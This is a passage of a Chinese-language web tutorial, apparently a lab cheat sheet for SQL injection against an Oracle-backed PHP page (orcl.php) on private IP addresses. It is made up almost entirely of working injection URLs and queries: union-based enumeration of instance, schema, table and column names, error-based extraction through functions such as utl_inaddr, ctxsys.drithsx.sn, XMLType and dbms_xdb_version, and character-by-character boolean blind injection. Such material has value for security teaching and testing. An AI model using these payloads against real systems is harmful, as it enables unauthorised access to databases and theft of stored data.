class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> instance_name <span class="keyword">from</span> v$instance),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>7.遍历数据库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;SYS&#x27;</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;OUTLN&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>)),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>8.遍历表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> sys.all_tables <span class="keyword">WHERE</span> OWNER <span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> sys.all_tables <span class="keyword">WHERE</span> OWNER <span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> ROWNUM <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> OWNER <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;tb_user&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>) </span><br></pre></td></tr></table></figure><p><strong>9.遍历表字段名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;FLAG&#x27;</span> <span class="keyword">AND</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>)),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> DUAL<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>10.查询字段数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> NAME<span class="operator">||</span>AGE <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> &quot;name&quot;<span class="operator">||</span>&quot;age&quot; <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">&#x27;username:&#x27;</span><span class="operator">||</span>NAME<span class="operator">||</span><span class="string">&#x27;age:&#x27;</span><span class="operator">||</span>AGE <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul><li><strong>utl_inaddr.get_host_name</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="number">11</span>g之前不需要任何权限，在<span class="number">11</span>g之后当前的数据库用户必须有网络访问权限</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> utl_inaddr.get_host_name( PAYLOAD位置 ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>ctxsys.drithsx.sn</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">处理文本的函数，传入参数错误的时会报错返回异常</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(    PAYLOAD位置  ))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>CTXSYS.CTX_REPORT.TOKEN_TYPE</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用于处理文本，也会出现参数错误返回异常</span><br><span class="line"><span class="keyword">select</span> CTXSYS.CTX_REPORT.TOKEN_TYPE((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual), <span class="string">&#x27;123&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><ul><li><strong>XMLType</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLType是oracle系统定义的数据类型，系统预定义了内部函数去访问XML数据</span><br><span class="line"><span class="keyword">select</span> XMLType(<span class="string">&#x27;&lt;:&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span>) <span class="keyword">from</span> dual;</span><br><span class="line">PS：调用的时候必须以<span class="operator">&lt;</span>:开头和<span class="operator">&gt;</span>结尾，即 <span class="string">&#x27;&lt;:&#x27;</span><span class="operator">||</span>balabala<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span> 或者 chr(<span class="number">60</span>)<span class="operator">||</span>balabal<span class="operator">||</span>chr(<span class="number">62</span>）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex，再导出(或者有replace函数替换成其他非空字符)</span><br></pre></td></tr></table></figure><ul><li><strong>dbms_xdb_version.checkin</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_xdb_version.checkin(   PAYLOAD位置  ) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><ul><li><strong>dbms_xdb_version.makeversioned</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned( PAYLOAD位置 ) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> </span><br></pre></td></tr></table></figure><ul><li><strong>dbms_xdb_version.uncheckout</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_xdb_version.uncheckout(   PAYLOAD位置  ) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><ul><li><strong>dbms_utility.sqlid_to_sqlhash</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash(  PAYLOAD位置  ) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><ul><li><strong>UTL_INADDR.get_host_name</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> UTL_INADDR.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><ul><li><strong>UTL_INADDR.get_host_address</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> UTL_INADDR.get_host_name(<span class="string">&#x27;~&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;~&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><ul><li><strong>ordsys.ord_dicom.getmappingxpath</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath( PAYLOAD位置 ,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>1.判断注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; &quot; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>2.查询数据库版本/用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode decode(substr((<span class="string">&#x27;abc&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>length</strong> 返回字符串长度<br><strong>ascii</strong>  返回字符的ascii码<br><strong>instr</strong>  搜索指定结果内是否包含关键字 存在返回1 否则返回0</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> decode(substr((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;O&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="keyword">from</span> dual)<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(<span class="keyword">user</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">4</span><span class="comment">-- </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">97</span><span class="comment">-- </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">84</span><span class="comment">-- #ascii码判断字符 T</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">69</span><span class="comment">-- #ascii码判断字符 E</span></span><br></pre></td></tr></table></figure><p><strong>3.instr</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;T&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TE&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TES&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TEST&#x27;</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>4.获取库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#子查询语句法:</span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span>(OWNER)) <span class="keyword">FROM</span> SYS.ALL_TABLES)<span class="operator">=</span><span class="number">19</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LENGTH(OWNER) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">&gt;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LENGTH(OWNER) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">=</span><span class="number">11</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR(OWNER,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR(OWNER,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">=</span><span class="number">65</span></span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">#普通方法</span><br><span class="line"></span><br><span class="line">#判断 数据库数量</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(owner)) <span class="keyword">from</span> all_tables)<span class="operator">=</span><span class="number">19</span></span><br><span class="line">#判断 库名长度</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(owner) <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(OWNER) <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> OWNER <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>,<span class="string">&#x27;OUTLN&#x27;</span>,<span class="string">&#x27;GSMADMIN_INTERNAL&#x27;</span>) <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span>) <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="number">9</span></span><br><span class="line">#跑库名</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> </span><br><span class="line">#跑出第一个库名 为sys后</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>) <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">#跑出第二个库名为 <span class="keyword">SYSTEM</span></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>) <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line">....继续跑</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5.获取表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"> </span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>6.获取字段名</strong><br>_</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">117</span><span class="comment">-- 跑ADMIN表内的第一个字段</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span 